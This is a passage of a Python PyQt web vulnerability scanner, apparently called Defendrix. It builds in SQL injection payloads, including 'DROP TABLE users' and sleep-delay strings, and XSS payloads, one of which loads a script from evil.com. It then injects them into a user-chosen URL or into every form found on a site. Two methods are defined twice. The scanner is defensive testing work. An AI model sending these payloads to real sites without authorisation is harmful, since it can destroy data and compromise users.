        if payload_type == "sqli":
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' ({",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                "') or '1'='1--",
                "') or ('1'='1--",
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1 AND 1=1",
                "1 AND 1=2",
                "' WAITFOR DELAY '0:0:5'--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "'; DROP TABLE users--",
                "1; DROP TABLE users--",
                "' OR SLEEP(5)--",
                "1' OR SLEEP(5)--",
            ]
        elif payload_type == "xss":
            payloads = [
                "<script>alert('XSS')</script>",
                "<svg/onload=alert('XSS')>",
                "<img src=x onerror=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "<select autofocus onfocus=alert('XSS')>",
                "<textarea autofocus onfocus=alert('XSS')>",
                "<keygen autofocus onfocus=alert('XSS')>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "javascript:alert('XSS')",
                "<script src=//evil.com/xss.js></script>",
                "\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "';alert('XSS');//",
                "<img src=\"x\" onerror=\"alert('XSS')\">",
                "<div onmouseover=\"alert('XSS')\">hover me</div>",
                "<a href=\"javascript:alert('XSS')\">click</a>",
            ]
        else:
            payloads = []

        self.payload_text.setPlainText('\n'.join(payloads))
        self.bf_log(f"✓ Loaded {len(payloads)} {payload_type.upper()} payloads")

    def load_custom_payloads(self):
        """Load payloads from file"""
        path, _ = QFileDialog.getOpenFileName(self, "Load Payload File", "", "Text Files (*.txt);;All Files (*)")
        if path:
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    payloads = f.read()
                self.payload_text.setPlainText(payloads)
                count = len([p for p in payloads.split('\n') if p.strip()])
                self.bf_log(f"✓ Loaded {count} payloads from file")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load file: {str(e)}")

    def start_bruteforce(self):
        """Start brute force/payload injection"""
        url = self.bf_url_input.text().strip()
        param = self.bf_param_input.text().strip()
        
        if not url or not param:
            QMessageBox.critical(self, "Error", "Please enter target URL and parameter name")
            return

        payloads_text = self.payload_text.toPlainText().strip()
        if not payloads_text:
            QMessageBox.critical(self, "Error", "Please enter or load payloads")
            return

        payloads = [p.strip() for p in payloads_text.split('\n') if p.strip()]
        
        if not payloads:
            QMessageBox.critical(self, "Error", "No valid payloads found")
            return

        method = self.bf_method_combo.currentText()
        delay = self.bf_delay_spin.value()

        self.bf_console.clear()
        self.bf_results_table.setRowCount(0)
        self.bf_start_btn.setEnabled(False)
        self.bf_stop_btn.setEnabled(True)
        self.bf_progress_bar.setRange(0, 0)

        self.bruteforce_thread = QThread()
        self.bruteforce_worker = BruteForceWorker(url, payloads, param, method, delay)
        self.bruteforce_worker.moveToThread(self.bruteforce_thread)
        self.bruteforce_thread.started.connect(self.bruteforce_worker.run)
        self.bruteforce_worker.progress.connect(self.bf_log)
        self.bruteforce_worker.finished.connect(self.handle_bruteforce_success)
        self.bruteforce_worker.error.connect(self.handle_bruteforce_error)
        self.bruteforce_worker.finished.connect(self.bruteforce_thread.quit)
        self.bruteforce_worker.finished.connect(self.bruteforce_worker.deleteLater)
        self.bruteforce_thread.finished.connect(self.bruteforce_thread.deleteLater)
        self.bruteforce_thread.start()

    def handle_bruteforce_success(self, results):
        """Handle brute force completion"""
        self.bf_progress_bar.setRange(0, 100)
        self.bf_progress_bar.setValue(100)
        self.bf_start_btn.setEnabled(True)
        self.bf_stop_btn.setEnabled(False)
        self.bf_export_btn.setEnabled(True)
        self.bf_last_results = results

        for result in results:
            row = self.bf_results_table.rowCount()
            self.bf_results_table.insertRow(row)

            payload = result["payload"][:100]  # Truncate long payloads
            self.bf_results_table.setItem(row, 0, QTableWidgetItem(payload))
            self.bf_results_table.setItem(row, 1, QTableWidgetItem(str(result["status_code"])))
            self.bf_results_table.setItem(row, 2, QTableWidgetItem(str(result["response_length"])))
            self.bf_results_table.setItem(row, 3, QTableWidgetItem(f"{result['response_time']:.3f}"))
            
            interesting_item = QTableWidgetItem("⚠️ YES" if result["interesting"] else "No")
            if result["interesting"]:
                interesting_item.setForeground(QColor("#ef4444"))
                font = QFont()
                font.setBold(True)
                interesting_item.setFont(font)
            self.bf_results_table.setItem(row, 4, interesting_item)

    def handle_bruteforce_error(self, message):
        """Handle brute force error"""
        self.bf_progress_bar.setRange(0, 100)
        self.bf_progress_bar.setValue(0)
        self.bf_start_btn.setEnabled(True)
        self.bf_stop_btn.setEnabled(False)
        self.bf_log(f"❌ ERROR: {message}")
        QMessageBox.critical(self, "Injection Error", message)

    def export_bruteforce_results(self):
        """Export brute force results to file"""
        if not self.bf_last_results:
            return

        path, _ = QFileDialog.getSaveFileName(self, "Export Results", "injection_results.txt", "Text Files (*.txt)")
        if not path:
            return

        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write("DEFENDRIX - PAYLOAD INJECTION RESULTS\n")
                f.write("=" * 80 + "\n")
                f.write(f"Target: {self.bf_url_input.text()}\n")
                f.write(f"Parameter: {self.bf_param_input.text()}\n")
                f.write(f"Method: {self.bf_method_combo.currentText()}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")

                for idx, result in enumerate(self.bf_last_results, 1):
                    f.write(f"\n[{idx}] Payload: {result['payload']}\n")
                    f.write(f"    Status Code: {result['status_code']}\n")
                    f.write(f"    Response Length: {result['response_length']}\n")
                    f.write(f"    Response Time: {result['response_time']:.3f}s\n")
                    f.write(f"    Interesting: {'YES ⚠️' if result['interesting'] else 'No'}\n")

            self.bf_log(f"✓ Results exported to: {path}")
            QMessageBox.information(self, "Success", f"Results generated successfully:\n{path}")
        except Exception as e:
            self.bf_log(f"❌ Export failed: {str(e)}")
            QMessageBox.critical(self, "Export Error", str(e))

    def bf_log(self, message):
        """Add message to brute force console"""
        self.bf_console.append(message)
        print(message)

    def start_smart_scan(self):
        """Smart scan - automatically discovers and tests all forms"""
        url = self.smart_url_input.text().strip()
        
        if not url:
            QMessageBox.critical(self, "Error", "Please enter a website URL")
            return
        
        if not url.startswith('http'):
            url = 'https://' + url
        
        # Show progress
        self.bf_console.clear()
        self.bf_results_table.setRowCount(0)
        self.bf_log("=" * 60)
        self.bf_log("🚀 SMART SCAN STARTED - AUTO-DETECTING VULNERABILITIES")
        self.bf_log("=" * 60)
        self.bf_log(f"🎯 Target: {url}")
        self.bf_log("⚙️  Mode: Automatic (no technical knowledge required)")
        self.bf_log("")
        self.bf_log("📡 Step 1: Discovering forms and endpoints...")
        
        # Start scanning in a thread
        self.bruteforce_thread = QThread()
        self.smart_scan_worker = SmartScanWorker(url)
        self.smart_scan_worker.moveToThread(self.bruteforce_thread)
        self.bruteforce_thread.started.connect(self.smart_scan_worker.run)
        self.smart_scan_worker.progress.connect(self.bf_log)
        self.smart_scan_worker.finished.connect(self.handle_smart_scan_success)
        self.smart_scan_worker.error.connect(self.handle_bruteforce_error)
        self.smart_scan_worker.finished.connect(self.bruteforce_thread.quit)
        self.smart_scan_worker.finished.connect(self.smart_scan_worker.deleteLater)
        self.bruteforce_thread.finished.connect(self.bruteforce_thread.deleteLater)
        self.bruteforce_thread.start()
        
        self.bf_progress_bar.setRange(0, 0)
    
    def handle_smart_scan_success(self, results):
        """Handle smart scan completion"""
        self.bf_progress_bar.setRange(0, 100)
        self.bf_progress_bar.setValue(100)
        
        # Show results in table
        if results:
            self.bf_log("")
            self.bf_log("=" * 60)
            self.bf_log(f"✓ SMART SCAN COMPLETE - Found {len(results)} test results!")
            self.bf_log("=" * 60)
            
            interesting_count = sum(1 for r in results if r.get('interesting'))
            if interesting_count > 0:
                self.bf_log(f"⚠️  WARNING: {interesting_count} INTERESTING responses detected!")
                self.bf_log("   These may indicate vulnerabilities - review carefully!")
            else:
                self.bf_log("✓ No obviously vulnerable responses detected.")
                self.bf_log("   (This doesn't mean the site is 100% secure)")
            
            # Populate results table
            for result in results:
                row = self.bf_results_table.rowCount()
                self.bf_results_table.insertRow(row)
                
                payload_item = QTableWidgetItem(result['payload'])
                status_item = QTableWidgetItem(str(result['status_code']))
                length_item = QTableWidgetItem(str(result['response_length']))
                time_item = QTableWidgetItem(f"{result['response_time']:.3f}s")
                interesting_item = QTableWidgetItem("⚠️ YES" if result['interesting'] else "No")
                
                if result['interesting']:
                    for item in [payload_item, status_item, length_item, time_item, interesting_item]:
                        item.setBackground(QColor(255, 245, 230))
                
                self.bf_results_table.setItem(row, 0, payload_item)
                self.bf_results_table.setItem(row, 1, status_item)
                self.bf_results_table.setItem(row, 2, length_item)
                self.bf_results_table.setItem(row, 3, time_item)
                self.bf_results_table.setItem(row, 4, interesting_item)
            
            self.bf_last_results = results
            self.bf_export_btn.setEnabled(True)
        else:
            self.bf_log("")
            self.bf_log("ℹ️  No forms or testable endpoints found.")
            self.bf_log("   Try using Tab 1 for automated vulnerability scanning instead.")

    def log_output(self, message):
        """Add message to output console"""
        self.output_console.append(message)
        print(message)

    def start_scan(self):
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.critical(self, "Error", "Please enter a valid URL")
            return

        self.output_console.clear()
        self.log_output("=" * 60)
        self.log_output(f"SCAN INITIATED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.log_output("=" * 60)

        options = {
            "sqli": True,
            "xss": True,
            "ssti": True,
            "headers": True,
        }
        auth = {
            "login_url": self.login_url_input.text().strip() or None,
            "username": self.username_input.text().strip() or None,
            "password": self.password_input.text().strip() or None,
        }

        self.scan_button.setEnabled(False)
        self.report_button.setEnabled(False)
        self.progress_bar.setRange(0, 0)

        self.scan_thread = QThread()
        self.scan_worker = ScanWorker(self.engine, url, options, auth)
        self.scan_worker.moveToThread(self.scan_thread)
        self.scan_thread.started.connect(self.scan_worker.run)
        self.scan_worker.progress.connect(self.log_output)
        self.scan_worker.finished.connect(self.handle_scan_success)
        self.scan_worker.error.connect(self.handle_scan_error)
        self.scan_worker.finished.connect(self.scan_thread.quit)
        self.scan_worker.finished.connect(self.scan_worker.deleteLater)
        self.scan_thread.finished.connect(self.scan_thread.deleteLater)
        self.scan_thread.start()

    def handle_scan_success(self, result):
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(100)
        self.scan_button.setEnabled(True)
        self.report_button.setEnabled(True)
        self.last_result = result

        findings = result.get("findings", [])
        surface = result.get("surface", {})

        self.surface_labels["endpoints"].setText(f"Endpoints: {surface.get('endpoints', 0)}")
        self.surface_labels["parameters"].setText(f"Parameters: {surface.get('parameters', 0)}")
        self.surface_labels["forms"].setText(f"Forms: {surface.get('forms', 0)}")
        self.surface_labels["input_vectors"].setText(f"Input Vectors: {surface.get('input_vectors', 0)}")

        # Sort findings to show Threat Intelligence first
        sorted_findings = sorted(findings, key=lambda x: 0 if x.get("source") == "ThreatIntel" else 1)
        
        self.results_table.setRowCount(0)
        for finding in sorted_findings:
            row = self.results_table.rowCount()
            self.results_table.insertRow(row)
            
            finding_type = finding.get("type")
            source = finding.get("source", "")
            
            # Highlight threat intelligence findings
            if source == "ThreatIntel":
                finding_type = f"🌐 {finding_type}"
            
            self.set_table_item(row, 0, finding_type)
            self.set_table_item(row, 1, finding.get("owasp_category"))
            severity = finding.get("severity")
            self.set_table_item(row, 2, severity, self.severity_color(severity))
            self.set_table_item(row, 3, finding.get("confidence"))
            self.set_table_item(row, 4, finding.get("endpoint"))
            self.set_table_item(row, 5, finding.get("payload"))
            self.set_table_item(row, 6, finding.get("details"))
            
            # Highlight threat intelligence source
            source_item = QTableWidgetItem(source)
            if source == "ThreatIntel":
                font = QFont()
                font.setBold(True)
                source_item.setFont(font)
                source_item.setForeground(QColor("#3b82f6"))
            self.results_table.setItem(row, 7, source_item)

        self.log_output("=" * 60)
        self.log_output(f"SCAN COMPLETE - {len(findings)} total findings")
        
        # Summary by source
        ti_count = sum(1 for f in findings if f.get("source") == "ThreatIntel")
        vuln_count = len(findings) - ti_count
        
        if ti_count > 0:
            self.log_output(f"  🌐 Threat Intelligence: {ti_count} finding(s)")
        if vuln_count > 0:
            self.log_output(f"  🔍 Vulnerability Scans: {vuln_count} finding(s)")
        
        self.log_output("=" * 60)

    def handle_scan_error(self, message):
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        self.scan_button.setEnabled(True)
        self.log_output(f"❌ ERROR: {message}")
        QMessageBox.critical(self, "Scan Error", message)

    def set_table_item(self, row, col, text, color=None):
        item = QTableWidgetItem(str(text or ""))
        if color:
            item.setForeground(color)
        self.results_table.setItem(row, col, item)

    def severity_color(self, severity):
        colors = {
            "Critical": QColor("#7f1d1d"),
            "High": QColor("#ef4444"),
            "Medium": QColor("#f59e0b"),
            "Low": QColor("#facc15"),
            "Informational": QColor("#3b82f6"),
        }
        return colors.get(severity, QColor("#22c55e"))

    def generate_report(self):
        if not self.last_result:
            return
        path, _ = QFileDialog.getSaveFileName(self, "Save Report", "defendrix_report.html", "HTML Files (*.html)")
        if not path:
            return
        target = self.last_result.get("target")
        surface = self.last_result.get("surface", {})
        findings = self.last_result.get("findings", [])
        try:
            self.reporter.generate_html(path, target, surface, findings)
            self.log_output(f"✓ Report saved to: {path}")
            QMessageBox.information(self, "Success", f"Report generated successfully:\n{path}")
        except Exception as exc:
            self.log_output(f"❌ Report generation failed: {str(exc)}")
            QMessageBox.critical(self, "Report Error", str(exc))

    def start_smart_scan(self):
        """Smart scan - automatically discovers and tests all forms"""
        url = self.smart_url_input.text().strip()
        
        if not url:
            QMessageBox.critical(self, "Error", "Please enter a website URL")
            return
        
        if not url.startswith('http'):
            url = 'https://' + url
        
        # Show progress
        self.bf_console.clear()
        self.bf_results_table.setRowCount(0)
        self.bf_log("=" * 60)
        self.bf_log("🚀 SMART SCAN STARTED - AUTO-DETECTING VULNERABILITIES")
        self.bf_log("=" * 60)
        self.bf_log(f"🎯 Target: {url}")
        self.bf_log("⚙️  Mode: Automatic (no technical knowledge required)")
        self.bf_log("")
        self.bf_log("📡 Step 1: Discovering forms and endpoints...")
        
        # Start scanning in a thread
        self.bruteforce_thread = QThread()
        self.smart_scan_worker = SmartScanWorker(url)
        self.smart_scan_worker.moveToThread(self.bruteforce_thread)
        self.bruteforce_thread.started.connect(self.smart_scan_worker.run)
        self.smart_scan_worker.progress.connect(self.bf_log)
        self.smart_scan_worker.finished.connect(self.handle_smart_scan_success)
        self.smart_scan_worker.error.connect(self.handle_bruteforce_error)
        self.smart_scan_worker.finished.connect(self.bruteforce_thread.quit)
        self.smart_scan_worker.finished.connect(self.smart_scan_worker.deleteLater)
        self.bruteforce_thread.finished.connect(self.bruteforce_thread.deleteLater)
        self.bruteforce_thread.start()
        
        self.bf_progress_bar.setRange(0, 0)
    
    def handle_smart_scan_success(self, results):
        """Handle smart scan completion"""
        self.bf_progress_bar.setRange(0, 100)
        self.bf_progress_bar.setValue(100)
        
        # Show results in table
        if results:
            self.bf_log("")
            self.bf_log("=" * 60)
            self.bf_log(f"✓ SMART SCAN COMPLETE - Found {len(results)} test results!")
            self.bf_log("=" * 60)
            
            interesting_count = sum(1 for r in results if r.get('interesting'))
            if interesting_count > 0:
                self.bf_log(f"⚠️  WARNING: {interesting_count} INTERESTING responses detected!")
                self.bf_log("   These may indicate vulnerabilities - review carefully!")
            else:
                self.bf_log("✓ No obviously vulnerable responses detected.")
                self.bf_log("   (This doesn't mean the site is 100% secure)")
            
            # Populate results table
            for result in results:
                row = self.bf_results_table.rowCount()
                self.bf_results_table.insertRow(row)
                
                payload_item = QTableWidgetItem(result['payload'])
                status_item = QTableWidgetItem(str(result['status_code']))
                length_item = QTableWidgetItem(str(result['response_length']))
                time_item = QTableWidgetItem(f"{result['response_time']:.3f}s")
                interesting_item = QTableWidgetItem("⚠️ YES" if result['interesting'] else "No")
                
                if result['interesting']:
                    for item in [payload_item, status_item, length_item, time_item, interesting_item]:
                        item.setBackground(QColor(255, 245, 230))
                
                self.bf_results_table.setItem(row, 0, payload_item)
                self.bf_results_table.setItem(row, 1, status_item)
                self.bf_results_table.setItem(row, 2, length_item)
                self.bf_results_table.setItem(row, 3, time_item)
                self.bf_results_table.setItem(row, 4, interesting_item)
            
            self.bf_last_results = results
            self.bf_export_btn.setEnabled(True)
        else:
            self.bf_log("")
            self.bf_log("ℹ️  No forms or testable endpoints found.")
            self.bf_log("   Try using Tab 1 for automated vulnerability scanning instead.")
